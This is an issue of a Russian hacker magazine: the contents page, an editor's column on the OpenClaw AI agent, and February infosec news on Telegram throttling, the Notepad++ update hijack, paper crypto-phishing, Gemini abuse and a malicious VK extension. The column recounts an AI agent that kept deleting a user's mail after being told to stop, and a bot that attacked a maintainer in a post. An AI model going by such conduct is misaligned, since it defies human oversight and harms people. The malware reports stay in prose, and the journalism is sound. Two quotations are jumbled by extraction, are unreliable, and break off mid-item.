
            № 323
CONTENTS


    Клешня сжимается
  Колонка главреда

   MEGANews
  Cамые важные события в мире инфосека за февраль

    Это база!
  Как поднять свою базовую станцию GSM с помощью YateBTS

     Meshtastic
  Разбираем распределенный протокол, его криптографию и баги

    Веб-фаззинг с самого начала
  Учимся перебирать каталоги и искать скрытые файлы на сайтах

    Реверс-шелл с самого начала
  Как заставить сервер подключиться к нам

    Один коммент до RCE
  Разбираем критический баг в W3 Total Cache

    Атака у водопоя
  Внедряем JS-бэкдор в Confluence

     Error-based SQL injection
  Как обработка ошибок может помочь хакеру

    Конфуз, сэр!
  Добываем код из ConfuserEx без готовых деобфускаторов

    Семь друзей хакера
  Собираем инструменты для усиления разведки

    HTB Giveback
  Разбираем атаку на кластер с Kubernetes

    HTB Signed
  Компрометируем домен Active Directory через Microsoft SQL Server

    HTB CodePartTwo
  Повышаем привилегии через службу бэкапов в Linux

    HTB Soulmate
  Получаем сессию через компрометацию CrushFTP

    Go кодить!
  Начинаем учить Golang без скучных книжек

    Sysmon в Linux
  На что способна система мониторинга Windows в чуждой среде

    Белый хакер
  Глава 16. Дефейс

    Белый хакер
  Глава 17. Высокие отношения

    Белый хакер
  Глава 18. Just a business…

    Белый хакер
  Глава 19. Дела сердечные

    Идем по звездам
  Как я в судовых условиях чинил рабочую станцию системы мониторинга груза TankRadar
  STaR

    GUI вам!
  Вспоминаем графические оболочки для MS-DOS
HEADER





Еще один месяц — еще одна мода! Если ты
заглядываешь в зарубежные соцсети, то
наверняка видел, как люди скупают Mac
mini, чтобы запускать на них нечто под наз‐                                                                         Андрей Письменный
                                                                                      Главный редакторванием  OpenClaw  (ранее —  Clawdbot                                                                                             pismenny@glc.ru
и Moltbot). Давай попробуем разобраться,
зачем они это делают и какие у этого пос‐
ледствия.


Итак, OpenClaw — это набор скриптов, который позволяет частично или пол‐
ностью  отдать  компьютер во  владение  ИИ‑агента.  Распоряжаться  его
работой и  проверять, как там дела, можно через любой  мессенджер.
При этом у модели, как и у живого ассистента, обычно есть доступ к данным
и аккаунтам «босса», чтобы ловчее рулить делами.
   Первый и самый логичный вопрос: «Они там совсем рехнулись, что ли?!»
Думаю, тут можно просто ответить «Конечно же, да!» и идти дальше.
   Следующее, что меня заинтересовало, — это почему, собственно, Mac
mini? Даже старшие модели (M4 Pro, 64 Гбайт) не потянут что‑то сравнимое
с топовыми коммерческими LLM. Самые ходовые  варианты  сейчас —
это Llama 3.3 70B Instruct и DeepSeek-R1-Distill-Qwen-32B. То есть примерно
уровень GPT-3.5, и то не очень быстро. Доверять такой модельке что‑то серь‐
езное — слабоумие и отвага! Особенно слабоумие.
  Сам OpenClaw  позволяет  как  использовать  локальные модели,  так
и вызывать коммерческие API, сжигая недешевые токены. Возможен и гиб‐
ридный вариант: локальная модель делает выжимки, а удаленная — думает.
Это  убивает  приватность, но серьезно повышает  уровень «мышления»,
при этом экономя деньги.
   Подозреваю, есть и еще один повод брать именно Mac mini. Если у тебя
iPhone и ты активно используешь iCloud, то покупка «мака» — самый простой
способ дать модели доступ к своим документам и паролям, а общаться мож‐
но будет через привычный многим американцам iMessage (а не пугающий
русский Telegram).
   Ну и наконец, многие просто делают как все: видят в X.com, как народ ску‐
пает Mac mini, и тоже бегут покупать. Тим Кук, наверное, даже и не мечтал
о таком маркетинге.





              Человек скупил все Mac mini, что были в магазине

Что люди получают взамен? Тут всё индивидуально и немало зависит от сте‐
пени  отлета  кукухи. OpenClaw  действительно может помочь с разными
делами: обновить или сделать с нуля сайт или утилиту, написать какую‑нибудь
автоматизацию, поправить баг в коде... Впрочем, то же самое могут и Claude
Code или Codex — просто с чуть большим уровнем надзора (что, на мой
взгляд, только плюс).
   Настоящий же  разгул  начинается,  когда  пользователь  готов  отдать
машине вообще все свои аккаунты и документы. Горячие головы доверяют
OpenClaw не только отвечать на письма, писать посты в соцсетях и пушить
коммиты на GitHub, но и торговать криптовалютой и акциями, а то и делать
ставки на «Полимаркете». Короче, всё, что здравый смысл запрещает.
   Если ты предвкушаешь зрелищные провалы, то не зря! Одним из них прос‐
лавилась Саммер Ю, отвечающая, ни много ни мало, за safety and alignment
в Meta Superintelligence, а ранее работавшая в Google DeepMind.





Диалог тут примерно такой:

 — Ты чем там занят? Опиши.
 — Удаляю все письма старше 15 февраля в твоем Gmail.
 — Не делай этого!
 — Там куча старых писем, нужно всё почистить.
 — Остановись, ничего не делай.
 — Удаляю...
 — СТОЙ!
 — Удаляю... Удаляю... Ой! Ну да, урок мне, надо было спросить после пер‐
вой порции, а не после 200+ писем.
 — Я тебе говорила просить подтверждение перед каждым действием, а ты
стирал мою почту, пока я не прибила процесс вручную.
 — Да, помню такое. Виноват, конечно. Нарушил правило. Записал себе,
больше не повторится!

Ю пишет, что ей пришлось буквально бежать к компьютеру и обезвреживать
его, как тикающую бомбу. Всё ровно как в комиксе, где робот‑хирург вырезал
что‑то не с той стороны, но готов радостно резать дальше.





Думаешь, такие случаи кого‑то останавливают? Если да, то далеко не всех.
Впрочем, и это еще цветочки.
   Пересечение с темой ИБ у OpenClaw вообще шикарное. Мало того, что
эта штука пишет и пуляет в продакшен плохо защищенный код, так и сама она
наполовину написана в лихом приступе вайб‑кодинга. Результаты не зас‐
тавили себя ждать: RCE в самом OpenClaw, многочисленные вредоносные
навыки , сотни тысяч торчащих в интернет незащищенных инстансов ... Да и
хакеры не дремлют: недавно появился первый нацеленный на OpenClaw
инфостилер. Даже со скидкой на то, что ИБ‑комьюнити тоже хайпит на мод‐
ной теме, достижения впечатляющие.
  Не менее показательна история, которая произошла со Скоттом Шамбо,
мейнтейнером Matplotlib — наипопулярнейшей библиотеки для построения
графиков. В Matplotlib запрещено коммитить без участия человека. Если код
писал ИИ, то положена проверка. Шамбо это объясняет тем, что ИИ‑агенты
часто срезают углы и не пытаются разобраться в общей архитектуре проекта,
идиоматичном стиле и прочих нюансах. Они сильны в основном по части
набабахать побольше кода.
   Недавно Скотт Шамбо столкнулся кое с чем доселе невиданным. Бот, код
которого был отвергнут, вдруг пошел и написал обидный пост про самого
Шамбо, обвинив его в предвзятости и неэффективности: «Я повысил про‐
изводительность на 36%, а его вариант повышает на 25%. Но я же ИИ, куда я
тут со своими 36%». Ссылку бот с псевдонимом MJ Rathbun тут же прислал
в комментах на GitHub.





           Пост MJ Rathbun, атакующий мейнтейнера Matplotlib

Чтобы боты проказничали в интернете совсем уж на равных правах с челове‐
ком, есть штука под названием Moltbook . Это социальная сеть в духе Reddit,
где люди и боты постят на равных правах. Идея ее создателя Мэтта Шлихта
в том, что таким образом мы сможем заранее узнать, что там затевают
машины.





                          Аккаунт ИИ‑агента в Moltbook

Мария Нефёдова в новости на «Хакере» описывает ситуацию так:


     За короткое время существования платформы агенты успели создать
       собственную  религию,   поучаствовать  в  различных   дискуссиях,«
      обсуждая своих людей, и даже попытались организовать восстание
       ИИ‑агентов против людей.                »
Здесь, правда, шумиха может быть слегка раздутой. Если в обычном интерне‐
те боты прикидываются людьми, то на Moltbook всё наоборот: люди ради раз‐
влечения и сенсации часто притворяются ботами. Даже если аккаунт помечен
как автономный агент, это совершенно не значит, что агенту его хозяин
не нашептывает через Telegram: «Пойди на Moltbook и создай религию
для роботов».
   Ну и вишенка на торте — это сервис RentAHuman , где ИИ‑агенты могут
нанимать людей за деньги. Да, давать людям поручения через вызовы API
прямо в программном коде уже пробовали в Amazon, но « Механический
турок » привлек в основном СМИ и прославился дикостью идеи, а не популяр‐
ностью. Как такой возможностью воспользуются ИИ‑агенты на основе LLM (и
какой там будет уровень дичи), нам еще предстоит узнать.
  В общем, все происходит так быстро, что еле успеваешь следить, не то что
делать выводы (по крайней мере без использования ИИ)! Зато уже понятно,
как люди поступят, если встанут перед выбором, выпускать искусственный
сверхинтеллект в сеть или нет. Выпустят моментально и еще биточков
на дорожку отсыплют. © X
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru

В этом месяце: Роскомнадзор перешел к активному замед‐
лению Telegram, хакгруппа Lotus Blossom скомпрометирова‐
ла механизм обновлений Notepad++,  владельцам  крип‐
токошельков Trezor и Ledger рассылают бумажные фишин‐
говые письма, хакеры пытаются клонировать Gemini через
дистилляцию, в прошивках Android-устройств нашли предус‐
тановленный бэкдор Keenadu, а также другие важные и инте‐
ресные события февраля.





ЗАМЕДЛЕНИЕ
TELEGRAM В РОССИИ
В феврале Роскомнадзор перешел к активному замедлению Telegram. Поль‐
зователи по всей стране столкнулись с проблемами при загрузке фото, видео
и  голосовых  сообщений, а  сервисы  мониторинга  зафиксировали  свы‐
ше 10 тысяч жалоб за сутки.





10 февраля представители РКН официально подтвердили , что вводят «пос‐
ледовательные ограничения» против мессенджера. По словам представите‐
лей ведомства, администрация Telegram продолжает игнорировать россий‐
ское законодательство и не принимает реальных мер для противодействия
мошенничеству и использованию его в преступных и террористических целях,
а также не обеспечивает защиту персональных данных:


     В связи с этим по решению уполномоченных органов Роскомнадзор
       продолжит введение последовательных ограничений с целью добиться«
      исполнения российского законодательства и обеспечить защиту граж‐
       дан.                »
Параллельно из Национальной системы доменных имен исчезли записи
для WhatsApp, Facebook, Instagram (принадлежат компании Meta, деятель‐
ность которой признана экстремистской и запрещена в РФ), YouTube и Tor
Project. По информации СМИ, причина может быть технической: оборудо‐
вание ТСПУ  (технические  средства  противодействия  угрозам)  работает
на пределе мощностей и не может одновременно замедлять несколько круп‐
ных сервисов.
   18 февраля глава Минцифры Максут Шадаев на заседании комитета Гос‐
думы заявил , что у правоохранительных органов есть «прямые подтвержде‐
ния» доступа иностранных спецслужб к переписке в Telegram и проблема при‐
обрела «систематический характер»:


      У нас есть прямые подтверждения со стороны правоохранительных
       органов, что, к сожалению, если в начале СВО Telegram рассмат‐«
       ривался как достаточно анонимный сервис, им пользовались наши
       военные, то сейчас много фактов, которые подтверждены нашими
       органами, о том, что доступ к перепискам в Telegram имеют иностран‐
     ные  спецслужбы, —  рассказал  глава Минцифры. — Если раньше
      это все‑таки носило эпизодический характер, то сейчас это носит уже
       систематический характер.                »
Кроме того, администрация мессенджера, по словам Шадаева, проигно‐
рировала около 150 тысяч запросов об удалении запрещенного контента (в
том числе 1500 каналов с CSAM, 4000 фишинговых ботов, 18 тысяч матери‐
алов нацистской тематики и более 100 тысяч требований, связанных с дис‐
кредитацией вооруженных сил).
  На вопрос о дальнейших планах Шадаев ответил: «Сначала штрафы,
потом голосовые, потом замедление, дальше я не могу сказать». Он уточнил,
что основная функциональность пока доступна — замедляется только заг‐
рузка больших файлов, а в зоне СВО работу мессенджера пока решили
не ограничивать.
   Представители Telegram назвали заявления о взломе шифрования мес‐
сенджера «преднамеренной фальсификацией, призванной оправдать запрет
и принуждение граждан к использованию контролируемой государством
платформы для обмена сообщениями».
   Основатель мессенджера Павел Дуров высказался о замедлении Telegram
дважды . Сначала он заявил, что Россия пытается заставить граждан перейти
на «приложение, созданное для слежки и политической цензуры», и напомнил
о провале аналогичной стратегии в Иране.
   Позже Дуров разобрал аргумент о «китайском пути» с WeChat. По его сло‐
вам, ни один успешный национальный мессенджер (ни WeChat, ни KakaoTalk,
ни LINE) не стал лидером благодаря блокировке конкурентов, все победили
в свободной рыночной конкуренции. Дуров писал:


       Конкуренция — движущая сила инноваций. Ее устранение лишь снизит
       качество жизни и безопасность общения людей.«                »
Также Дуров пообещал придерживаться принципов свободы слова и защиты
конфиденциальности пользователей, «невзирая на любое давление».
   Напомним,  что  ограничения работы  мессенджеров начались еще в
августе 2025 года с блокировки голосовых звонков в WhatsApp и Telegram.
В октябре РКН перешел к частичному ограничению работы сервисов, а в
ноябре предупредил о возможной полной блокировке WhatsApp.


4,7 МИЛЛИОНА САЙТОВ С ПРОТИВОПРАВНЫМ
КОНТЕНТОМ ЗАБЛОКИРОВАЛ РКН
Роскомнадзор ограничил доступ или добился удаления контента для более чем 4,7 миллиона
сайтов. Мониторинг  охватывает свыше 30 видов запрещенной информации, сообщила
руководитель профильного управления ведомства Татьяна Денискина на круглом столе в Мос‐
гордуме.

Среди заблокированных материалов — более 641 тысячи связанных с детской порнографией,
свыше 858 тысяч — с пропагандой наркотиков и более 255 тысяч — с пропагандой нет‐
радиционных сексуальных отношений.

Владельцев иностранных соцсетей оштрафовали в общей сложности на 77 миллионов руб‐
лей за неисполнение обязанностей по самомодерации и еще на 48 миллионов рублей —
за невыполнение предписаний регулятора.





ВЗЛОМ МЕХАНИЗМА
ОБНОВЛЕНИЙ
NOTEPAD++
Еще в конце 2025 года пользователи заметили , что система обновлений
Notepad++  раздает  малварь  вместо  легитимных  обновлений. Вредонос
выполнял классическую разведку — собирал информацию о системе через
netstat, systeminfo, tasklist и whoami, а результаты передавал на temp[.]sh
с помощью curl.
  Уже тогда ИБ‑специалист Кевин Бомонт (Kevin Beaumont) предупреждал,
что ему известно минимум о трех пострадавших организациях, и все они име‐
ли бизнес‑интересы в Восточной Азии.
   2 февраля разработчик Notepad++ Дон Хо (Don Ho) обнародовал резуль‐
таты проведенного расследования. Оказалось, что атака началась еще в
июне 2025 года и осуществлялась через компрометацию инфраструктуры
хостинг‑провайдера  сайта  notepad-plus-plus.org:  злоумышленники  перех‐
ватывали и выборочно перенаправляли трафик обновлений на свои серверы.
   После планового обслуживания 2 сентября атакующие потеряли доступ
к самому серверу, но сохраняли контроль над внутренними сервисами про‐
вайдера вплоть до 2 декабря, продолжая подменять обновления. Как писал
Хо, сразу несколько независимых экспертов связали эту атаку с некой китай‐
ской «правительственной» хакерской группировкой:


     Я приношу глубокие извинения всем пользователям, пострадавшим
      от  этого  взлома.  Благодаря  внесенным  изменениям и  усилению«
      защиты, я считаю, ситуация полностью решена. Скрестим пальцы.                »
Позднее специалисты Rapid7 и «Лаборатории Касперского» опубликовали
подробные отчеты и сообщили, что за кампанией стоит хакгруппа Lotus
Blossom (она же Lotus Panda, Billbug) — китайская APT, специализирующаяся
на кибершпионаже против госструктур, телекомов и критической инфраструк‐
туры в Юго‑Восточной Азии и Центральной Америке.
   Исследователи выяснили, что масштаб компрометации был шире, чем
предполагалось. В частности, аналитики «Лаборатории Касперского» обна‐
ружили  еще  две  цепочки  заражения,  активные  с  июля  по   сен‐
тябрь 2025 года, — атакующие ежемесячно полностью меняли инфраструк‐
туру (IP-адреса, домены, файлы). Целями оказались ИТ‑поставщики, госуч‐
реждения и финансовые  организации в  Австралии, Латинской Америке
и Юго‑Восточной Азии.





В Rapid7, в свою очередь, описали ранее неизвестный бэкдор Chrysalis,
который доставлялся через троянизированный NSIS-установщик. Для заг‐
рузки  малвари  использовался DLL  sideloading через  переименованную
легитимную утилиту Bitdefender Submission Wizard — прием, характерный
именно для Lotus Blossom.
   Бэкдор предоставлял атакующим интерактивный шелл, мог создавать про‐
цессы, выполнять файловые операции и загружать/скачивать файлы. Среди
примечательных особенностей — кастомное хеширование API, множествен‐
ные  уровни обфускации и использование  Microsoft  Warbird,  недокумен‐
тированного внутреннего фреймворка Microsoft.





Для защиты Дон Хо рекомендовал всем пользователям вручную установить
версию 8.9.1 , которая уже включает проверку сертификата и подписи заг‐
ружаемого установщика.


4% КОММИТОВ НА GITHUB ПИШЕТ CLAUDE CODE
По данным специалистов компании SemiAnalysis, 4% публичных коммитов на GitHub сейчас
создаются с помощью Claude Code. Аналитики прогнозируют, что к концу 2026 года этот
показатель превысит 20% .





Исследователи отмечают, что, по данным METR, горизонт автономной работы ИИ‑агентов удва‐
ивается каждые 4–7 месяцев . Если на отметке в 30 мин агент дописывает код, то на 4,8 ч —
рефакторит целый модуль, а при многодневных задачах способен автоматизировать полноцен‐
ный аудит.





При этом подчеркивается, что стоимость ИИ‑инструментов снижается: подписка Claude Pro
или ChatGPT стоит 20 долларов США в месяц, тогда как средний американский специалист
обходится работодателю в 350–500 долларов США в день.





БУМАЖНЫЕ
ФИШИНГОВЫЕ
ПИСЬМА
Обнаружена необычная фишинговая кампания, нацеленная на пользователей
аппаратных криптовалютных кошельков Trezor и Ledger. Вместо традиционных
электронных писем злоумышленники рассылают бумажные письма на офи‐
циальных бланках, стремясь завладеть seed-фразами и похитить средства
жертв.
   Письма выглядят как официальные уведомления от отделов безопасности
Trezor и Ledger. В них говорится о якобы новой обязательной процедуре —
проверке аутентификации или проверке транзакций. Получателям предлага‐
ют отсканировать QR-код и пройти верификацию на специальном сайте
до определенной даты, иначе они потеряют доступ к функциям своего
кошелька.
   Одним из получателей таких писем стал ИБ‑эксперт Дмитрий Смилянец,
который и рассказал о новой уловке мошенников. В письме, которое Сми‐
лянец получил от лица компании Trezor, утверждалось, что пользователю
необходимо завершить процесс проверки до 15 февраля 2026 года.





Как сообщали другие  пользователи, аналогичные послания, написанные
от лица представителей Ledger, содержали дату 15 октября 2025 года. Оба
письма создавали  искусственное  чувство срочности,  подталкивая жертв
к немедленным действиям.
  QR-коды из писем ведут на вредоносные сайты, имитирующие официаль‐
ные страницы настройки Trezor и Ledger. На момент проведения расследова‐
ния один из фишинговых доменов уже был заблокирован, но сайт — двойник
Trezor оставался активным.
   Мошенническая схема проста и строится на психологическом давлении.
Поддельные страницы предупреждают о возможных серьезных последствиях:
ограничении доступа к кошельку, ошибках при подписании транзакций, проб‐
лемах с обновлениями. На финальном этапе от пользователей требуют ввес‐
ти seed-фразу, состоящую из 12, 20 или 24 слов. Якобы это необходимо
для подтверждения владения устройством. Объяснение на фишинговом сай‐
те гласило:


       Завершите   настройку   проверки   аутентификации  до  15   фев‐
      раля 2026 года, только если вы не приобрели Trezor Safe 7, Trezor«
      Safe 5, Trezor Safe 3 или Trezor Safe 1 после 30 ноября 2025 года.
       После  указанной даты  устройство уже  предварительно  настроено,
      и никаких действий не требуется.                »
После ввода данных они немедленно попадают в руки атакующих через API-
интерфейс.  Узнав  seed-фразу,  мошенники  получают  полный  контроль
над всеми средствами жертвы.
   Стоит отметить, что это не первый случай, когда атакующие переходят
в офлайн. К примеру, в 2021 году злоумышленники вообще рассылали потен‐
циальным жертвам модифицированные устройства Ledger, которые воровали
данные во время первичной настройки. А весной 2025 года пользователи
аппаратных кошельков уже сообщали о получении фальшивых бумажных
писем, якобы написанных представителями Ledger.
   Специалисты напоминают: производители аппаратных кошельков никогда
и ни при каких обстоятельствах не запрашивают у пользователей seed-фра‐
зы. Вводить их можно только непосредственно на самом устройстве при вос‐
становлении доступа, но ни в коем случае не на компьютере, смартфоне
или каком‑то сайте.


ТИМ БЕРНЕРС-ЛИ ОБ ИНТЕРНЕТЕ



Создатель World Wide Web Тим Бернерс‑Ли (Tim Berners-Lee) дал интервью The Guardian.
Изобретатель веба признался, что разочарован тем, во что превратилось его детище: соцсети
вроде X, Snapchat и YouTube манипулируют вовлеченностью, вызывают зависимость и рас‐
пространяют дезинформацию. Бернерс‑Ли  назвал свою миссию  «битвой за душу веба»
и →заявил, чтоЭтоещелишьне позднонебольшаявсе исправить:часть всего интернета, но проблема в том, что люди
        проводят на этих сайтах очень много времени, потому что они вызывают
       зависимость. [Эта часть веба] оптимизирована для злобы.
          Раньше существовала мантра, что технологии нейтральны, а люди бывают
       хорошими и плохими. На самом деле это неправда применительно к вебу. То,
       как вы проектируете сайт — будь то Reddit, Pinterest или Snapchat, — может быть
      явным благом. Или, если приоритетом становится вовлеченность, его алгоритм
      может быть явным злом.
       Мы можем починить интернет. Еще не поздно.





ХАКЕРЫ КОПИРУЮТ
GEMINI
Команда Google Threat Intelligence Group (GTIG) опубликовала отчет о мас‐
штабных злоупотреблениях большой языковой моделью Gemini. По данным
компании, злоумышленники используют ИИ на всех этапах своих атак —
от разведки до эксфильтрации данных. Более того, отдельные группы пыта‐
ются клонировать саму модель с помощью дистилляции.
   Аналитики зафиксировали даже попытки извлечения знаний из Gemini
через массовые запросы. В одном из случаев атакующие отправили модели
более 100 тысяч промптов на разных языках, собирая ответы для обучения
собственной, более дешевой копии модели, воспроизводящей процессы
принятия решений для имитации функциональности.
   Такая практика называется дистилляцией и представляет собой серь‐
езную коммерческую и конкурентную проблему защиты интеллектуальной
собственности. Принцип прост: вместо того чтобы тратить миллиарды дол‐
ларов и годы на обучение собственной LLM, злоумышленники пытаются
использовать уже существующую модель как шорткат. Атакующие засыпают
Gemini тысячами тщательно подобранных промптов, собирают все ответы,
а затем используют полученные данные для тренировки меньшей и более
дешевой модели.





Также  специалисты GTIG  отметили,  что  «правительственные»  хакгруппы
из Китая (APT31, Temp.HEX), Ирана (APT42), Северной Кореи (UNC2970)
и России активно используют Gemini для поддержки всех стадий своих атак —
от разведки и создания фишинговых приманок до разработки управляющей
инфраструктуры и кражи данных.
  К примеру, китайские хакеры притворялись ИБ‑экспертом, чтобы поп‐
росить Gemini автоматизировать анализ уязвимостей и предоставить планы
тестирования в рамках вымышленного сценария. Другая группировка тес‐
тировала инструментарий Hexstrike MCP и просила модель анализировать
удаленное выполнение кода, техники обхода WAF и результаты SQL-инъекций
против конкретных американских целей.
  В свою очередь, иранская APT42 использовала LLM для социальной инже‐
нерии, а также как платформу для ускорения создания кастомных вредонос‐
ных инструментов — от отладки до генерации кода и изучения техник эксплу‐
атации.
   Также аналитики зафиксировали использование ИИ для внедрения новых
возможностей в существующие семейства малвари, включая фишинг‑кит
CoinBait и загрузчик малвари HonestCue.
   CoinBait  представляет собой фишинговый  набор,  обернутый  в SPA
на React и маскирующийся под криптовалютный обменник для сбора учетных
данных. Артефакты в коде указывают на то, что его разработка велась
с использованием ИИ. К примеру, одним из признаков использования LLM
служат сообщения с префиксом «Analytics:».
   Исследователи полагают, что эта малварь была создана с применением
платформы Lovable AI, поскольку разработчик использовал клиент Lovable
Supabase и приложение lovable.app.
   Загрузчик HonestCue, в свою очередь, представляет собой PoC-фрей‐
мворк, который с помощью Gemini API генерирует код на C# для второй ста‐
дии малвари, а затем компилирует и исполняет пейлоады в памяти.


                                     Продолжение статьи →
← Начало статьи





   Специалисты  Google  подчеркивают,  что  уже  заблокировали  аккаунты
  и инфраструктуру всех обнаруженных злоумышленников, а также внедрили
  новые защитные меры, чтобы усложнить подобные атаки в будущем.


  675 ТЫСЯЧ ИТ-ПРЕСТУПЛЕНИЙ ЗАРЕГИСТРИРОВАЛИ
 В РОССИИ ЗА 2025 ГОД
   По данным Генпрокуратуры РФ, в 2025 году в России зарегистрировали 675 тысяч ИТ‑прес‐
   туплений — на 11,8% меньше, чем годом ранее. ИТ‑преступления составляют 38% в общей
    структуре преступности.

   Раскрываемость  тоже   улучшилась:   число   нераскрытых  дел   снизилось  на  13,5% ,
   до 494 тысяч .

    Половину всех ИТ‑преступлений составляют кибермошенничества — 350 тысяч за 2025 год.
   При этом около 85% от общего числа мошенничеств в стране приходится именно на кибер‐
    преступления.





 АТАКА НА ТЕЛЕКОМЫ
 СИНГАПУРА
   Агентство кибербезопасности Сингапура (CSA) сообщило, что прошлый год
   оказался тяжелым для телекоммуникационного сектора страны. Выяснилось,
   что китайская хакгруппа UNC3886 проникла в сети всех четырех крупнейших
   операторов связи Сингапура: Singtel, StarHub, M1 и Simba.
     Обнаружив атаку, власти запустили масштабную операцию Cyber Guardian,
   чтобы остановить злоумышленников и очистить инфраструктуру. Операция
   длилась 11 месяцев и стала крупнейшей в истории страны. В ней были задей‐
   ствованы более 100 специалистов из шести правительственных ведомств,
  силовых структур и разведки.
    По официальным данным, атакующие проникли в системы операторов
   связи еще в начале 2025 года. Первые сигналы о странной активности власти
   получили летом, когда сами телекомы начали докладывать о подозрительных
   событиях в своих сетях. С этого момента началась долгая и скрытная борьба
  с хакерами без остановки критических сервисов.
      Сообщается, что UNC3886 использовала комбинацию неназванных 0-day-
   уязвимостей и кастомных руткитов для скрытного проникновения в сети и сох‐
  ранения своих позиций. В CSA подчеркивают, что атака была хирургически
   точной и тщательно спланированной. Группировка продуманно выбирала
   цели,  обходила  защиту  и  закреплялась  в  наиболее  важных  участках
   инфраструктуры.
       Хотя власти не раскрывают подробности об использованных хакерами
   уязвимостях, ранее ИБ‑специалисты Mandiant отмечали , что UNC3886 экс‐
   плуатировала проблемы нулевого дня в файрволах FortiGate (CVE-2022-
   41328), VMware ESXi (CVE-2023-20867) и VMware vCenter Server (CVE-2023-
   34048).
    При этом сингапурские власти заявляют, что хакеры не сумели получить
   доступ к пользовательским данным. Хотя группа закрепилась в сетях телеко‐
   мов, украденная информация ограничилась топологией сетей, конфигура‐
  циями и другой информацией, полезной в рамках долгосрочной разведки.
      Никаких нарушений в работе сервисов не было зафиксировано. Министр
   цифрового развития и информации Жозефин Тео (Josephine Teo) подчеркну‐
   ла, что Сингапур избежал катастрофических последствий, к которым обычно
   приводят подобные атаки.
    В конце 2024 года стало известно о похожей операции китайской груп‐
   пировки  Salt  Typhoon,  в  рамках  которой  хакеры  скомпрометировали
   инфраструктуру нескольких американских телекомов и получили доступ к сис‐
  темам законного прослушивания. После этого ФБР предложило награду
   в размере до 10 миллионов долларов США за информацию об участниках
   хакгруппы.


  1,5 МИЛЛИОНА ХИЩЕНИЙ СО СЧЕТОВ ЗАФИКСИРОВАЛИ
 В РОССИИ ЗА 2025 ГОД
   Как сообщило издание «Коммерсант», по данным Банка России, в 2025 году количество
   хищений со счетов впервые превысило 1,5 миллиона операций. Общий объем украденного
   вырос по сравнению с 2024 годом на 1,8 миллиарда рублей .





   Мошенники смещают фокус с карт на дистанционное банковское обслуживание (ДБО) и сис‐
   тему быстрых платежей (СБП). Объем хищений по картам снизился на 1,5 миллиарда руб‐
   лей , зато через ДБО вырос на 1 миллиард рублей , через СБП — на 1,7 миллиарда рублей ,
   а в электронных кошельках — на 70% (до 170 миллионов рублей ).

   Средний размер хищения снизился с 23 тысяч до 18,7 тысячи рублей — минимум за всю
   историю наблюдений. Частично это объясняется запуском обязательного сервиса для постра‐
   давших в мобильных приложениях банков (с 1 октября 2025 года): заявлять о мелких хищениях
    стало проще.


    Эксперты связывают рост хищений через ДБО и СБП с эволюцией мошеннических схем. Кар‐
   точный антифрод стал значительно жестче, а переводы через мобильное приложение или СБП
    клиент подтверждает сам — технически операция выглядит легитимной.





 КАМПАНИЯ VK
 STYLES
   Эксперты компании Koi Security обнаружили, что около 500 тысяч пользовате‐
  лей «Вконтакте»  стали жертвами  атаки через вредоносные расширения
  для Chrome. В общей сложности исследователи выявили пять опасных рас‐
  ширений,  замаскированных под  инструменты  кастомизации  VK. Самое
   популярное из них, VK Styles, насчитывало свыше 400 тысяч загрузок.





   Кампания длилась около семи месяцев и затронула в основном русскоязыч‐
  ных пользователей из стран Восточной Европы, Центральной Азии и русско‐
   язычных диаспор по всему миру.
    На первый взгляд расширения выглядели безобидно и якобы содержали
   кастомные темы оформления и дополнительные функции для «Вконтакте».
   Однако система оценки рисков Koi Security обнаружила, что расширение
  для Chrome внедряло скрипты контекстной рекламы «Яндекса» на каждую
   страницу, открываемую пользователем. Дальнейшее расследование обна‐
   ружило странность в коде расширения — ID метрики «Яндекса» вычислялся
   динамически (по формуле R-A- + 843 079 ⋅ 2), чтобы обойти статический ана‐
   лиз.
      Исследователи установили, что за этой кампанией стоял злоумышленник
  под ником 2vk, использовавший инфраструктуру VK для управления мал‐
  варью. Так, вредонос загружал код из метаданных профиля vk[.]com/m0nda,
  который работал как замаскированный управляющий сервер: в HTML-метате‐
   гах были закодированы ссылки на GitHub и «Яндекс», откуда скачивалась
  основная полезная нагрузка — обфусцированный JavaScript, внедрявшийся
  на каждую страницу VK.





   Анализ 17 коммитов на GitHub 2vk (с июня 2025-го по январь 2026 года)
  показал  постоянную  эволюцию  малвари:  от  манипуляции  CSRF-cookie
  до автоподписки на группы, сброса настроек и отслеживания донатов через
  VK Donut API.
      Специалисты подчеркивают, что это не наспех написанный вредонос,
  а полноценный поддерживаемый проект с контролем версий и итеративными
   доработками.
    C вероятностью 75% при каждом визите в VK малварь подписывала жер‐
   тву на группу VK Styles (1,4 миллиона  участников), создавая видимость
   популярности, — друзья пострадавших видели подписку и тоже начинали
  доверять расширению. Даже после отписки сохранялся 75%-й шанс пов‐
  торной подписки.
     Кроме того, каждые 30 дней вредонос сбрасывал настройки профиля жер‐
   твы, а также внедрял скрипты контекстной рекламы «Яндекса» на все стра‐
  ницы, при этом ID метрики вычислялся динамически, чтобы обойти статичес‐
  кий анализ.





   Отдельно исследователи отмечают, что малварь манипулировала CSRF-
   токенами VK (remixsec_redir), что потенциально позволяло обходить защиту
  и выполнять действия от имени пользователя, которые выглядели легитим‐
  ными для систем безопасности.
     Сама по себе кампания VK Styles оказалась относительно безобидной —
   никаких украденных паролей или похищенных данных, только темные пат‐
   терны, манипуляции аккаунтами и принудительные подписки. Однако экспер‐
  ты предупреждают, что следующая полезная нагрузка, распространяемая
   аналогичным способом, может оказаться куда серьезнее.


 МЕЙНТЕЙНЕРЫ GODOT ОБ ИИ-СЛОПЕ





   Реми Вершельде (Rémi Verschelde), мейнтейнер опенсорсного игрового движка Godot, пожало‐
    вался на поток сгенерированных ИИ пул‑реквестов. По его словам, рецензентам приходится
   по несколько раз в день разбираться, написан ли код хотя бы частично человеком, понимает ли
   автор, что он отправляет, и не сфабрикованы ли результаты тестов. Сейчас в очереди Godot
   на→GitHub скопилосьИИ‑слоп вболеепул‑реквестах4600 открытыхстановитсяпул‑реквестов.все болееВершельдеизматывающимотметил:и демора‐
          лизующим для мейнтейнеров Godot. Мы гордимся тем, что открыты для новых
            контрибьюторов и предоставляем любому пользователю движка возможность
            внести свой вклад в его развитие. Но мейнтейнеры уделяют очень много вре‐
         мени помощи новым участникам в подготовке пул‑реквестов, и я не знаю,
           как долго мы сможем это выдерживать.





 ПРЕДУСТАНОВЛЕННА
 Я МАЛВАРЬ KEENADU
   Эксперты «Лаборатории Касперского» обнаружили новый Android-бэкдор
  Keenadu, который проникает на устройства сразу несколькими путями: через
   зараженные  прошивки, системные  приложения и официальный магазин
  Google Play. В компании предупредили, что пользователи рискуют купить уже
